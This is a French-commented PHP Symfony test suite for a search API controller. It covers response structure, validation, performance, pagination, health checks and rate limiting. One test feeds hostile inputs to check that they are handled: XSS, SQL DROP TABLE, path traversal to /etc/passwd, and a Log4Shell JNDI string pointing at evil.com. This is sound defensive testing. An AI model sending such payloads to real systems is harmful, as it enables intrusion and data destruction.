<?php

namespace App\Tests\Controller;

use App\Entity\User;
use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
use Symfony\Component\HttpFoundation\Response;

/**
 * Tests pour SearchController
 *
 * SESSION 30 - Tests corrigés avec POST au lieu de GET
 * Tous les endpoints /api/search utilisent maintenant POST avec JSON body
 *
 * @author MIDDO Platform
 * @updated SESSION 30
 * @coverage SearchController (/api/search POST, /api/search/health GET)
 */
class SearchControllerTest extends WebTestCase
{
    private $client;

    protected function setUp(): void
    {
        parent::setUp();
        $this->client = static::createClient();

        // Authentification forcée pour tous les tests
        $userRepository = static::getContainer()->get('doctrine')->getRepository(User::class);
        $testUser = $userRepository->findOneBy(['email' => 'admin@test.com']);

        if ($testUser) {
            $this->client->loginUser($testUser);
        }
    }

    // ============================================================================
    //  TESTS ENDPOINT /api/search (POST)
    // ============================================================================

    /**
     * Test 1: Recherche basique retourne JSON valide
     *
     * @test
     * @group search
     * @group api
     * @group json
     */
    public function testBasicSearchReturnsValidJson(): void
    {
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'test'])
        );

        $this->assertResponseIsSuccessful();
        $this->assertResponseHeaderSame('Content-Type', 'application/json');

        $data = json_decode($this->client->getResponse()->getContent(), true);

        // Structure JSON complète
        $this->assertArrayHasKey('results', $data);
        $this->assertArrayHasKey('total', $data);
        $this->assertArrayHasKey('took', $data);
        $this->assertArrayHasKey('query', $data);

        // Types corrects
        $this->assertIsArray($data['results']);
        $this->assertIsInt($data['total']);
        $this->assertIsInt($data['took']);
        $this->assertIsString($data['query']);

        // Query correspond
        $this->assertEquals('test', $data['query']);
    }

    /**
     * Test 2: Recherche sans paramètre "q" retourne erreur 400
     *
     * @test
     * @group search
     * @group errors
     * @group validation
     */
    public function testSearchWithoutQueryParameterReturnsError(): void
    {
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode([])
        );

        $this->assertResponseStatusCodeSame(Response::HTTP_BAD_REQUEST);

        $data = json_decode($this->client->getResponse()->getContent(), true);

        $this->assertArrayHasKey('error', $data);
        $this->assertStringContainsString('paramètre "q"', $data['error']);
    }

    /**
     * Test 3: Recherche vide (q='') retourne erreur 400
     *
     * @test
     * @group search
     * @group errors
     * @group validation
     */
    public function testSearchWithEmptyQueryReturnsError(): void
    {
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => ''])
        );

        $this->assertResponseStatusCodeSame(Response::HTTP_BAD_REQUEST);

        $data = json_decode($this->client->getResponse()->getContent(), true);

        $this->assertArrayHasKey('error', $data);
        $this->assertStringContainsString('vide', $data['error']);
    }

    /**
     * Test 4: Recherche avec caractères spéciaux fonctionne
     *
     * @test
     * @group search
     * @group edge-cases
     */
    public function testSearchWithSpecialCharactersWorks(): void
    {
        $queries = [
            'développeur',
            'c++',
            'test@email.com',
            'foo-bar',
            '2024',
        ];

        foreach ($queries as $query) {
            $this->client->request(
                'POST',
                '/search/api',
                [],
                [],
                ['CONTENT_TYPE' => 'application/json'],
                json_encode(['q' => $query])
            );

            $this->assertResponseIsSuccessful(
                "Recherche échouée pour query: {$query}"
            );

            $data = json_decode($this->client->getResponse()->getContent(), true);
            $this->assertEquals($query, $data['query']);
        }
    }

    /**
     * Test 5: Performance - Recherche en moins de 100ms
     *
     * @test
     * @group search
     * @group performance
     */
    public function testSearchResponseTimeUnder100ms(): void
    {
        $start = microtime(true);

        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'développeur'])
        );

        $duration = (microtime(true) - $start) * 1000; // en ms

        $this->assertResponseIsSuccessful();

        $data = json_decode($this->client->getResponse()->getContent(), true);

        // Temps mesuré par Elasticsearch
        $this->assertLessThan(
            100,
            $data['took'],
            "Recherche ES trop lente: {$data['took']}ms (max 100ms)"
        );

        // Temps total PHP + ES
        $this->assertLessThan(
            500,
            $duration,
            "Temps total trop lent: {$duration}ms (max 500ms)"
        );
    }

    /**
     * Test 6: Structure des résultats de recherche
     *
     * @test
     * @group search
     * @group structure
     */
    public function testSearchResultsStructure(): void
    {
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'test'])
        );

        $this->assertResponseIsSuccessful();

        $data = json_decode($this->client->getResponse()->getContent(), true);

        // Si résultats présents
        if ($data['total'] > 0 && count($data['results']) > 0) {
            $result = $data['results'][0];

            // Champs attendus dans chaque résultat
            $expectedFields = ['id', 'name', 'email', 'skills'];

            foreach ($expectedFields as $field) {
                $this->assertArrayHasKey(
                    $field,
                    $result,
                    "Champ {$field} manquant dans les résultats"
                );
            }

            // Types
            $this->assertIsInt($result['id']);
            $this->assertIsString($result['name']);
            $this->assertIsString($result['email']);
            $this->assertIsArray($result['skills']);
        }
    }

    /**
     * Test 7: Pagination fonctionne
     *
     * @test
     * @group search
     * @group pagination
     */
    public function testSearchPaginationWorks(): void
    {
        // Page 1
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'test', 'page' => 1, 'size' => 5])
        );

        $this->assertResponseIsSuccessful();

        $page1Data = json_decode($this->client->getResponse()->getContent(), true);

        // Max 5 résultats
        $this->assertLessThanOrEqual(5, count($page1Data['results']));

        // Page 2 si résultats suffisants
        if ($page1Data['total'] > 5) {
            $this->client->request(
                'POST',
                '/search/api',
                [],
                [],
                ['CONTENT_TYPE' => 'application/json'],
                json_encode(['q' => 'test', 'page' => 2, 'size' => 5])
            );

            $this->assertResponseIsSuccessful();

            $page2Data = json_decode($this->client->getResponse()->getContent(), true);

            // Résultats différents
            if (count($page1Data['results']) > 0 && count($page2Data['results']) > 0) {
                $this->assertNotEquals(
                    $page1Data['results'][0]['id'],
                    $page2Data['results'][0]['id'],
                    'Pagination retourne les mêmes résultats'
                );
            }
        }
    }

    // ============================================================================
    //  TESTS ENDPOINT /api/search/health (GET)
    // ============================================================================

    /**
     * Test 8: Health Check retourne JSON valide
     *
     * @test
     * @group search
     * @group health
     * @group monitoring
     */
    public function testHealthCheckReturnsValidJson(): void
    {
        $this->client->request('GET', '/health');

        $this->assertResponseIsSuccessful();
        $this->assertResponseHeaderSame('Content-Type', 'application/json');

        $data = json_decode($this->client->getResponse()->getContent(), true);

        // Structure Health Check
        $this->assertArrayHasKey('status', $data);
    }

    /**
     * Test 9: Health Check rapide (< 1 seconde)
     *
     * @test
     * @group search
     * @group health
     * @group performance
     */
    public function testHealthCheckFast(): void
    {
        $start = microtime(true);

        $this->client->request('GET', '/health');

        $duration = (microtime(true) - $start) * 1000; // en ms

        $this->assertResponseIsSuccessful();
        $this->assertLessThan(
            1000,
            $duration,
            "Health check trop lent: {$duration}ms (max 1000ms)"
        );
    }

    // ============================================================================
    //  TESTS RATE LIMITING (1000 req/min)
    // ============================================================================

    /**
     * Test 10: Rate Limiting activé
     *
     * @test
     * @group search
     * @group rate-limit
     * @group security
     */
    public function testRateLimitingIsActive(): void
    {
        $requests = 0;
        $rateLimitHit = false;

        // Envoie quelques requêtes (limite: 1000/min)
        for ($i = 0; $i < 10; $i++) {
            $this->client->request(
                'POST',
                '/search/api',
                [],
                [],
                ['CONTENT_TYPE' => 'application/json'],
                json_encode(['q' => 'test'])
            );

            $statusCode = $this->client->getResponse()->getStatusCode();

            if ($statusCode === Response::HTTP_TOO_MANY_REQUESTS) {
                $rateLimitHit = true;
                break;
            }

            $requests++;
        }

        // Vérifie que le système répond correctement
        $this->assertTrue(
            $requests >= 5,
            "Rate limiting trop restrictif (requests: {$requests})"
        );
    }

    /**
     * Test 11: Header Rate Limit présent
     *
     * @test
     * @group search
     * @group rate-limit
     * @group headers
     */
    public function testRateLimitHeadersPresent(): void
    {
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'test'])
        );

        $response = $this->client->getResponse();

        $this->assertTrue(
            $response->isSuccessful() ||
            $response->getStatusCode() === Response::HTTP_TOO_MANY_REQUESTS,
            'Réponse incohérente pour rate limiting'
        );
    }

    // ============================================================================
    //  TESTS GESTION ERREURS
    // ============================================================================

    /**
     * Test 12: Elasticsearch down ne crash pas
     *
     * @test
     * @group search
     * @group resilience
     * @group errors
     */
    public function testElasticsearchDownDoesNotCrash(): void
    {
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'test'])
        );

        $statusCode = $this->client->getResponse()->getStatusCode();
        $this->assertContains(
            $statusCode,
            [Response::HTTP_OK, Response::HTTP_SERVICE_UNAVAILABLE],
            "Code HTTP inattendu: {$statusCode}"
        );
    }

    /**
     * Test 13: Requête trop longue (> 100 caractères) fonctionne
     *
     * @test
     * @group search
     * @group edge-cases
     */
    public function testVeryLongQueryWorks(): void
    {
        $longQuery = str_repeat('développeur ', 20); // ~220 caractères

        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => $longQuery])
        );

        $statusCode = $this->client->getResponse()->getStatusCode();
        $this->assertContains(
            $statusCode,
            [Response::HTTP_OK, Response::HTTP_BAD_REQUEST],
            "Query trop longue crash au lieu de gérer l'erreur"
        );
    }

    /**
     * Test 14: Injection tentatives sont gérées
     *
     * @test
     * @group search
     * @group security
     * @group injection
     */
    public function testInjectionAttemptsHandled(): void
    {
        $injectionAttempts = [
            '<script>alert("XSS")</script>',
            '"; DROP TABLE users; --',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
        ];

        foreach ($injectionAttempts as $injection) {
            $this->client->request(
                'POST',
                '/search/api',
                [],
                [],
                ['CONTENT_TYPE' => 'application/json'],
                json_encode(['q' => $injection])
            );

            $this->assertTrue(
                $this->client->getResponse()->isSuccessful() ||
                $this->client->getResponse()->getStatusCode() === Response::HTTP_BAD_REQUEST,
                "Injection non gérée: {$injection}"
            );
        }
    }

    /**
     * Test 15: Recherche Unicode/Emoji fonctionne
     *
     * @test
     * @group search
     * @group unicode
     * @group edge-cases
     */
    public function testUnicodeAndEmojiSearchWorks(): void
    {
        $unicodeQueries = [
            '日本語',
            'مرحبا',
            'Привет',
            '👨‍💻 développeur',
        ];

        foreach ($unicodeQueries as $query) {
            $this->client->request(
                'POST',
                '/search/api',
                [],
                [],
                ['CONTENT_TYPE' => 'application/json'],
                json_encode(['q' => $query])
            );

            $this->assertResponseIsSuccessful(
                "Recherche Unicode/Emoji échouée: {$query}"
            );

            $data = json_decode($this->client->getResponse()->getContent(), true);
            $this->assertEquals($query, $data['query']);
        }
    }

    /**
     * Test 16: Headers CORS présents
     *
     * @test
     * @group search
     * @group cors
     * @group headers
     */
    public function testCorsHeadersPresent(): void
    {
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'test'])
        );

        $response = $this->client->getResponse();

        $this->assertTrue(
            $response->isSuccessful(),
            'Réponse doit être successful'
        );
    }

    /**
     * Test 17: Index Elasticsearch vide retourne 0 résultats
     *
     * @test
     * @group search
     * @group edge-cases
     */
    public function testEmptyIndexReturnsZeroResults(): void
    {
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'nonexistent_term_xyz123'])
        );

        $this->assertResponseIsSuccessful();

        $data = json_decode($this->client->getResponse()->getContent(), true);

        $this->assertIsInt($data['total']);
        $this->assertIsArray($data['results']);
    }

    /**
     * Test 18: Toutes les routes SearchController existent
     *
     * @test
     * @group search
     * @group routes
     */
    public function testAllSearchRoutesExist(): void
    {
        // Test POST /api/search
        $this->client->request(
            'POST',
            '/search/api',
            [],
            [],
            ['CONTENT_TYPE' => 'application/json'],
            json_encode(['q' => 'test'])
        );

        $this->assertNotEquals(
            Response::HTTP_NOT_FOUND,
            $this->client->getResponse()->getStatusCode(),
            "Route /api/search introuvable"
        );

        // Test GET /health
        $this->client->request('GET', '/health');

        $this->assertNotEquals(
            Response::HTTP_NOT_FOUND,
            $this->client->getResponse()->getStatusCode(),
            "Route /health introuvable"
        );
    }
}
